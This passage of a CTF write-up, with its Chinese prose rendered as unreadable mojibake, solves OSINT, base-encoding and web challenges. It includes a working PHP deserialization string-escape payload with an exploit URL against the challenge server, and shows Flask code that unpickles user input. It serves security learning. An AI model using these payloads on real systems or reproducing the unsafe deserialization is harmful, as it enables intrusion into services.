src="/2021/02/11/CTF_2021NewsCTF/image-20210208175342822.png"></p><blockquote><p>å“‡å“ˆå“ˆå“ˆå“ˆä½³ä½³ä»Šå¤©è¿ç€5ä¸ªè¿æ°”ç‹<br>æœç„¶æˆ‘åˆ˜æŸäººåä¸è™šä¼ </p></blockquote><p>==&gt; åˆ˜ä½³ä½³</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208194712410.png"></p><blockquote><p>1æœˆ14æ—¥ 22:05</p><p>ä»Šå¤©ç»ˆäºæ”¾å‡å•¦ï¼åƒç«é”…æ•²å¼€å¿ƒçš„ï¼</p></blockquote><blockquote><p>2020å¹´12æœˆ31æ—¥ 00:00</p><p>é©¬ä¸Šæ”¾å‡å•¦ï¼ï¼ï¼ï¼ï¼ï¼<br>æ™šä¸Šçœ‹ç”µå½±<br>è¦<br>æ³¨æ„<br>ç»†èŠ‚~</p></blockquote><blockquote><p>2020å¹´12æœˆ25æ—¥ 22:22</p><p>ä¸‰ä¸ªèŠ‚æ—¥è¿ç€è¿‡ å¥½å¿«è½ æ˜å¤©å°±ç¬¬äºŒä¸ªåå¹´å•¦        </p></blockquote><blockquote><p>2020å¹´12æœˆ22æ—¥ 23:33</p><p>ä»Šå¤©å­¦æ ¡çš„äº‹ä¹Ÿå¥½å¤š-n-<br>å¸Œæœ›è¿‡å‡ å¤©å¯ä»¥åƒé¡¿å¥½çš„(*â‰§â–½â‰¦)ï¾‰ï½¼))</p><p>å››å·ç»µé˜³ </p></blockquote><p>ç»“åˆè¯„è®º</p><p><img src="/2021/02/11/CTF_2021NewsCTF/psc.jpg"></p><p>==&gt; birthday: 20001226</p><p>é¡ºä¾¿ï¼Œä¸€ç›´æœ‰ 2931479782 è¿™ä¸ªQQç‚¹èµå’Œè¯„è®ºã€‚ä»–æœ‰æ¡è¯´è¯´</p><blockquote><p>hint:å¼±å£ä»¤ åœ°åŒºå­—æ¯ï¼Œåå­—å­—æ¯(<em>Â¯ã…¿Â¯</em>;)ç”Ÿæ—¥ ä¸åŒå½¢å¼éƒ½è¯•è¯•</p></blockquote><p>ç›¸å†Œï¼š</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208175419070.png"></p><p><code>sU*f4#OY/6+ghE</code> ä¸æ‡‚</p><p>å†å›åˆ°å¦¹å¦¹çš„ç›¸å†Œï¼Œç¬¬ä¸‰ä¸ªç›¸å†Œï¼Œæ ¹æ®æç¤º </p><p>2+3+8 å¯†ç ä¸º</p><p><code>lsljj20001226</code></p><p>å¾—åˆ°ä¸€å¼ äºŒç»´ç ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209180235911.png"></p><p>æ‰«ç å¾—åˆ°</p><pre class="language-none"><code class="language-none">My MicroBlog nameï¼šå•Šè¿™ovo001</code></pre><p>å»å¾®åšæ‰¾æ‰¾ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209180747524.png"></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209180819031.png"></p><p>æœ‰ Nano å”‰ï¼ˆx</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209180842507.png"></p><p>2598888 ä¹å±± =&gt; å°šçº¬è‚¡ä»½</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209181440142.png"></p><p>è§£å¾—å¦¹å¦¹çš„ç¬¬ä¸€ä¸ªç›¸å†Œå¯†ç ï¼ˆå“¥å“¥çš„å…¬å¸ï¼‰</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209181542666.png"></p><p>å¾—åˆ°ä¸¤å¼ å›¾</p><p><img src="/2021/02/11/CTF_2021NewsCTF/psc2.jpg"></p><p><img src="/2021/02/11/CTF_2021NewsCTF/psc3.jpg"></p><p><code>a2492853776@163.com</code></p><p>é‚£çœ‹ç¬¬ä¸€å¼ å›¾å¥½äº†ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209181952221.png"></p><p>å‘ç°åŸå›¾ç»“å°¾éšå†™äº†ä¸ª zip</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209182039405.png"></p><pre class="language-none"><code class="language-none">ä»¥ä¸‹æ˜¯é¢˜ç›®æè¿°ï¼šå™¢ï¼Œæˆ‘çš„è€å…„ï¼Œå¾ˆæŠ±æ­‰çœ‹äº†ä½ çš„ç…§ç‰‡ï¼Œè¿™æ„Ÿè§‰çœŸæ˜¯å¤ªç³Ÿäº†ã€‚æˆ‘æ˜¯è¯´ï¼Œè™½ç„¶éš”äº†è¿™ä¹ˆä¹…ï¼Œæˆ‘è¿˜æ˜¯å¿ä¸ä½æƒ³ç”¨æ²‰é»˜ä¹‹çœ¼æ¥å¯»æŸ¥è¿™ä¹‹ä¸­çš„ç§˜å¯†ã€‚æˆ‘æƒ³ä½ å¯èƒ½å¯¹æˆ‘ä»¬çš„é´å­æœ‹å‹æˆ–è€…å±è‚¡è€å¼Ÿæœ‰ä»€ä¹ˆåè§ï¼Œå°±åƒæˆ‘ä»¬éƒ½ä»¥ä¸ºçº¦ç¿°å°¼å…ˆç”Ÿæ€»æ‰“ä»–çš„ç‹—ï¼Œä½†æ˜¯äº‹å®ä¸æ˜¯é‚£æ ·çš„ï¼Œä»–ä»¬å°±åƒå…„å¼Ÿä¸€æ ·ï¼Œæˆ‘äº²çœ¼æ‰€è§ï¼Œæˆ‘å‘èª“ã€‚------------------------------------------------é¢˜ç›®1ï¼šï¼ˆé¢˜ç›®1å’Œé¢˜ç›®2éƒ½å¯ä»¥å¾—åˆ°flagç›¸å†Œå¯†ç ï¼Œè‡ªç”±æŠ‰æ‹©é€‰æ‹©å“ªæ¡ï¼‰æ‰¾åˆ°å¯†ç ï¼Œå°†å¯†ç å‘é€ç»™æŒ‡å®šçš„é‚®ç®±ï¼Œå³å¯è·å¾—flagï¼Œå¿«æ¥æŒ‘æˆ˜å§ï¼ï¼ˆå¯†ç å¿…é¡»å†™åœ¨ä¸»é¢˜ä¸Šè€Œä¸æ˜¯å†…å®¹ä¸Šï¼‰</code></pre><p><code>æ˜Ÿæ˜Ÿçš„å¤œ.png</code> éšå†™</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209183434340.png"></p><p>å¦ä¸€å¼ å¸¦æœ‰é‚®ç®±çš„å›¾ä¹Ÿéšå†™æœ‰ zipã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209182324784.png"></p><p><code>å€’æ•°ç¬¬2æ­¥.txt</code></p><pre class="language-none"><code class="language-none">é¢˜ç›®2ï¼šï¼ˆé¢˜ç›®1å’Œé¢˜ç›®2éƒ½å¯ä»¥å¾—åˆ°flagç›¸å†Œå¯†ç ï¼Œè‡ªç”±æŠ‰æ‹©é€‰æ‹©å“ªæ¡ï¼‰æœ¬æ¬¡é¢˜ç›®è€ƒéªŒæ”¶é›†èƒ½åŠ›ä¹Ÿè¦è€ƒæŸ¥æœç´¢èƒ½åŠ›ä¸€èµ·æ¥å¿«ä¹çš„å›ç­”é—®é¢˜å§ï¼ï¼ˆå°†æ‰€æœ‰ç­”æ¡ˆçš„é¦–å­—æ¯å¤§å†™è¿åœ¨ä¸€èµ·å³æ˜¯ç­”æ¡ˆï¼‰è¯·æ³¨æ„æ˜¯å¤§å†™å¤§å†™å¤§å†™å¤§å†™å¤§å†™å¤§å†™å¤§å†™å¤§å†™ç­”æ¡ˆéƒ½æ˜¯è‹±æ–‡å­—æ¯ä¾‹å¦‚é¢˜ç›®æè¿°ï¼šçŒç¡ä¹”æ˜¯æŒ‡----ç­”ï¼šJoseph Robinette Biden, Jrï¼ˆJoe Bidenï¼‰ã€‚é¦–å­—æ¯æ˜¯J1.æ‰“5æŠŠcsgoå‡ºè‡ª2.ç°ä»»ç¾å›½ä¸­å¤®æƒ…æŠ¥å±€å±€é•¿æ˜¯ï¼ˆå‡ºé¢˜æ—¶é—´2021å¹´2æœˆ1æ—¥ï¼‰3.â€œæ˜¯ç”·äººå°±ä¸‹ä¸€ç™¾å±‚â€è¢«ä¸€ä½UPä¸»æ‰¾åˆ°æ­£ç¡®çš„ç‰ˆæœ¬å¹¶ä¸”æ›´æ­£äº†ç™¾åº¦è¯æ¡ä¸Šçš„é”™è¯¯ä¿¡æ¯ï¼Œè¯·é—®ä»–æ›´æ­£çš„è¯æ¡çš„ç‰ˆæœ¬å“ˆå¸Œå€¼æ˜¯å¤šå°‘ï¼Ÿ4.IAUåœ¨1928å›½é™…å¤©æ–‡ä¼šè®®ä¸­è®¤å®šçš„æ–°çš„æ˜Ÿåº§çš„æ‹‰ä¸å­¦åæ˜¯ï¼Ÿ5.https://www.bilibili.com/ç½‘ç«™ipåœ°å€ä¸º110/120.xx.xx.xxçš„è¿è¥å•†çš„å®˜ç½‘æ˜¯ï¼Ÿ</code></pre><ol><li><p>Gï¼ˆã€ŠGoyang Ubur Uburã€‹ï¼Œå°å°¼å®½å¸¦å¹¿å‘Šçš„èƒŒæ™¯éŸ³ä¹çš„æ­Œè¯ç©ºè€³ï¼Œæ­Œè¯åŸæ–‡åº”ä¸º Takupaz Dance Crewï¼Œå¡”åº“å¸•å…¹èˆè¹ˆé˜Ÿ   </p></li><li><p>Wï¼ˆ<a href="https://en.wikipedia.org/wiki/William_Joseph_Burns">William Joseph Burns</a>ï¼Œï¼ˆé—®äº†å‡ºé¢˜äººè¯´æ˜¯è¿™ä¸ªã€‚ã€‚ï¼‰è¯¦è§ <a href="https://en.wikipedia.org/wiki/Director_of_the_Central_Intelligence_Agency">Director of the Central Intelligence Agency</a> </p><p><del>David S. Cohenï¼Œ20210120 å®£èª“å°±èŒï¼Œæ³¨æ„åˆ°å¾ˆå¤šåœ°æ–¹ç”šè‡³ä¸­æ–‡ç»´åŸºç™¾ç§‘éƒ½æ²¡æ›´æ–°ï¼Œè¯¦æƒ… <a href="https://www.cia.gov/about/">https://www.cia.gov/about/</a></del></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209203954297.png"></p></li><li><p>Fï¼ˆf2549bf9e2c93acbb794041185c26fc0. è€ƒè™‘åˆ°2.1ä¹‹å‰ï¼Œä¸”ç­”æ¡ˆéƒ½æ˜¯è‹±æ–‡å­—æ¯ï¼Œæ˜¯ UP ä¸»</p><p>ï¼ˆå“ˆå¸Œå€¼å°± A-F å˜›</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209214058782.png"></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209214155104.png"></p></li><li><p>Oï¼ˆOphiuchusï¼Œè›‡å¤«åº§</p></li><li><p>Kï¼ˆé‡‘å±±äº‘ï¼Œ<a href="http://www.ksyun.com,ç”¨/">www.ksyun.comï¼Œç”¨</a> <a href="http://ping.chinaz.com/">ping å·¥å…·</a>çœ‹äº†çœ‹ï¼Œå°ç ´ç«™çš„æœåŠ¡å•†çœŸå¤š</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209201113130.png"></p></li></ol><p><code>GWFOK</code></p><p>ç„¶åå‘é‚®ä»¶ç»™é‚£ä¸ªé‚®ç®±ã€‚</p><p>è¿™é‡Œæˆ‘è¿˜ä»¥ä¸ºç›´æ¥å°±æ˜¯ç›¸å†Œå¯†ç äº†å‘¢ï¼Œå»çˆ†ç ´äº†ç©ºé—´ç›¸å†Œï¼ˆx</p><p>ç„¶åéªŒè¯ç ç¡®è®¤ç‚¹ä¸åŠ¨ï¼Œäºæ˜¯çœ‹äº†çœ‹QQç©ºé—´ç›¸å†Œçš„ä»£ç ï¼Œå¥½ä¸‘å•Šã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209213540794.png"></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209213402571.png"></p><pre class="language-none"><code class="language-none">æ­å–œä½ ï¼è¿™æ˜¯ç›¸å†Œâ€œæ——å¸œâ€çš„å¯†ç ï¼ˆåªå¥—äº†ç®€å•çš„4å±‚ï¼‰ï¼š23khUrNeAf1igP4PixgoUUDQLaRGGfEpPsFEd9CCKaUWfwYmG4ZmCwFVEkNNwtijxVcn6a6XkwC1ctqMLAax4aGK</code></pre><p>åˆæ˜¯ base å…¨å®¶æ¡¶</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209214955746.png"></p><p>å¾—åˆ°ç›¸å†Œå¯†ç  <code>youfindme!</code></p><p>æ‹¿åˆ° flag</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210209215103759.png"></p><p><code>flag{th1s_1s_A_Fla9_aNd_n0bod9_C3n_f1nd_1t}</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="è´æ–¯å®¶æ—"><a href="#è´æ–¯å®¶æ—" class="headerlink" title="è´æ–¯å®¶æ—"></a>è´æ–¯å®¶æ—</h3><pre class="language-none"><code class="language-none">;gM&amp;7AOTKl:236b;HHIm='%8*=''2q;FX]*&lt;,5Z\&gt;'a(\&lt;*)(o:2&lt;mE;DL+19egH[A2@7[A28+B;L2)3;-,Jc&lt;EDpe@kpeS=]Ipp@5)e@;FN&lt;1@VeM3=tj,I=u'8;;FXDT@;BL0@o[bo=]\dGA2?f'&lt;CL(F@k`.CASl6l:236V@Vo.c&gt;&amp;6JY@mipjA4Tls;/:D4=]I2%@PTof&lt;*)gK;eo9(@VeIr</code></pre><p>base85</p><pre class="language-none"><code class="language-none">SzJSeERNNjFBRWJXWW5zWWl5RFVoTkZvZzRiTW9iNkViR25VM1lOd3VLd2poRzNLQW1hUWNIc2NNYUFZa0tnRE1GblFRZ0ZCZ2Z3RFNLakg0cUxrYWZpd3IzUEZ0c0xkemlaNjF6bmVqZlA0cDJWdHZKQkx3YU1yb28xTWN0SkRKblE=</code></pre><p>base64</p><pre class="language-none"><code class="language-none">K2RxDM61AEbWYnsYiyDUhNFog4bMob6EbGnU3YNwuKwjhG3KAmaQcHscMaAYkKgDMFnQQgFBgfwDSKjH4qLkafiwr3PFtsLdziZ61znejfP4p2VtvJBLwaMroo1MctJDJnQ</code></pre><p>base32</p><pre class="language-none"><code class="language-none">ä»…é™ç¬¬ä¸€å¤©ï¼Œæ”¯ä»˜å®å£ä»¤[å¤§å‰å¤§åˆ©èŒæ–°åƒé¸¡]</code></pre><blockquote><p>Base å®¶æ—ï¼š</p><p>ä¸»è¦æœ‰ 100, 94, 92, 91, 85, 64, 62, 58, 56, 52, 36, 32, 16 å¤§æ¦‚è¿™äº›å§ã€‚</p><p>éƒ¨åˆ† alphabetï¼š</p><pre class="language-none"><code class="language-none">BASE16 = 0123456789ABCDEFBASE32 = ABCDEFGHIJKLMNOPQRSTUVWXYZ234567BASE36 = 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZBASE52 = 0123456789BCDFGHJKLMNPQRSTVWXYZbcdfghjklmnpqrstvwxyzBASE56 = 23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyzBASE58 = 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyzBASE62 = 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzBASE64 = ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/BASE85 = 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&amp;()*+-;&lt;=&gt;?@^_`{|}~BASE91 = ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~"BASE94 = !"#$%&amp;\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~</code></pre><p>Python3 base85 ä¸­åˆ†ä¸º base64.a85encode å’Œ base64.b85encodeï¼Œaæ˜¯ Ascii85ï¼Œbæ˜¯ IPv6ï¼ˆ<a href="https://tools.ietf.org/html/rfc1924">RFC1924</a>ï¼‰ã€‚</p><ol><li><p><a href="https://en.wikipedia.org/wiki/Ascii85">ASCII85</a> encoding. This is the default. 0x00000000 is compressed to z. Spaces are not compressed.</p></li><li><p><a href="https://en.wikipedia.org/wiki/Ascii85">Adobe ASCII85</a> encoding is same as previous except data is enclosed between &lt;~ and ~&gt; .</p></li><li><p><a href="https://rfc.zeromq.org/spec:32/Z85/">ZeroMQ (Z85)</a> encoding. NOTE! Even though specification says input length must be divisible by 4, this is not currently enforced. Spaces and zeroes are not compressed.</p></li><li><p>Character set from <a href="https://tools.ietf.org/html/rfc1924">RFC1924</a> which is an April fools joke. Spaces and zeroes are not compressed.</p></li></ol></blockquote><h3 id="å¥½æ—¥å­"><a href="#å¥½æ—¥å­" class="headerlink" title="å¥½æ—¥å­"></a>å¥½æ—¥å­</h3><blockquote><p>å¥½æ—¥å­ï¼Œ11æœˆ11æ—¥</p></blockquote><pre class="language-none"><code class="language-none">â†—â†—â†â†–â†•â†–â†•â†³â†—â†°â†—â†ºâ†–â†’â†”â†°â†•â†™â†•â†ºâ†”â†°â†–â†—â†”â†–â†”â†‘â†”â†’â†â†‘â†–â†“â†—â†“â†â†”â†”â†—â†â†˜â†•â†–â†â†•â†•â†»â†—â†°â†•â†“â†–â†â†—â†²â†—â†‘â†—â†±â†—â†˜â†•â†”â†•â†»â†â†“â†”â†˜â†—â†•â†•â†”â†–â†‘â†–â†–â†—â†”â†—â†²â†”â†™â†—â†—â†—â†—â†”â†”â†•â†°â†”â†”â†•â†°â†–â†°â†”â†”â†—â†’â†•â†”â†—â†•â†–â†’â†•â†–â†•â†“â†–â†â†—â†°â†”â†‘â†—â†–â†•â†»â†â†•â†•â†•â†â†–â†—â†˜â†”â†”â†•â†”â†–â†’â†”â†°â†â†”â†–â†–â†–â†˜â†•â†±â†â†‘â†”â†°â†”â†—â†•â†˜â†•â†ºâ†â†’â†—â†–â†—â†²â†â†™=</code></pre><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=jiantou">ç®­å¤´åŠ å¯†</a></p><pre class="language-none"><code class="language-none">G6fmJNRzinzWvqr1SC4w8f5oJcPLAKHdo3xEdQVDLyGGtjtjZtBdERfcPJqFo5e6HtdRz4VXk1zwhn2FL9</code></pre><p>base58</p><pre class="language-none"><code class="language-none">U2FsdGVkX19oI1ocbbcM5wensOuKarNA3noE/HS74RNYqh0stoMpQohkLGqF</code></pre><p>å† base64 å¯ä»¥å‘ç°å¼€å¤´æ˜¯ <code>Salted__</code>ï¼ŒåŠ ç›åŠ å¯†äº†ã€‚</p><p><a href="https://www.sojson.com/encrypt_rabbit.html">Rabbit è§£å¯†</a></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208213700246.png"></p><pre class="language-none"><code class="language-none">klv,oclz{mkd_slp_vb_zjjs_slp}</code></pre><p>æ‡’äº†ï¼Œç›´æ¥å» <a href="https://quipqiup.com/">quipquip</a> è·‘äº†ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208214007562.png"></p><p><code>flag{the_day_is_good_day}</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>ç­¾åˆ°é¢˜</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'boyfriend'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'hack!!!!'</span><span class="token punctuation">,</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$payload</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$GDUT</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'A&amp;D'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'666'</span><span class="token punctuation">;</span><span class="token variable">$GDUT</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Hed9eh0g'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'no_girlfriend'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span>  <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'boyfriend'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'fuck_no_key!!!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$GDUT</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'A&amp;D'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$payload</span><span class="token punctuation">;</span>        <span class="token variable">$GDUT</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$GDUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$GDUT</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Hed9eh0g'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'has_girlfriend'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'fuck_no_girlfriend!!!'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </span></code></pre><p><strong>PHP ååºåˆ—åŒ–æ¼æ´</strong></p><p>å…ˆæœ¬åœ°è¯•äº†è¯•ï¼Œpayload ä¸º <code>flagmiaotony</code> å¾—åˆ°çš„åºåˆ—åŒ–å¯¹è±¡</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210210230936642.png"></p><p><code>";s:8:"Hed9eh0g";s:14:"has_girlfriend";}</code> é•¿åº¦ä¸º40ï¼Œç”¨ 10ä¸ª <code>flag</code> æ»¤æ‰å°±å¥½äº†ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210210230916007.png"></p><p><strong>Payload:</strong></p><pre class="language-none"><code class="language-none">flagflagflagflagflagflagflagflagflagflag";s:8:"Hed9eh0g";s:14:"has_girlfriend";}http://47.106.172.29:2333/?payload=flagflagflagflagflagflagflagflagflagflag%22;s:8:%22Hed9eh0g%22;s:14:%22has_girlfriend%22;}</code></pre><p><code>newsctf{i_Lov3_nEws4tF_wEb}</code></p><h3 id="beautifulgirlfriend"><a href="#beautifulgirlfriend" class="headerlink" title="beautifulgirlfriend"></a>beautifulgirlfriend</h3><p><a href="http://47.106.172.29:8081/">http://47.106.172.29:8081</a></p><p>è®¿é—® <code>/source</code> å¾—åˆ°æºç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token keyword">import</span> Hed9eh0g_girlfriendapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">girl</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/guess'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pickle_data <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'payload'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span>            she <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> she<span class="token punctuation">.</span>name <span class="token operator">==</span> Hed9eh0g_girlfriend<span class="token punctuation">.</span>name <span class="token keyword">and</span> she<span class="token punctuation">.</span>age <span class="token operator">==</span> Hed9eh0g_girlfriend<span class="token punctuation">.</span>age<span class="token punctuation">:</span>                <span class="token keyword">return</span> Hed9eh0g_girlfriend<span class="token punctuation">.</span>flag        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"Something wrong"</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span>encoding<span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>        <span class="token keyword">return</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>read<span class="token punctuation">(</span>__file__<span class="token 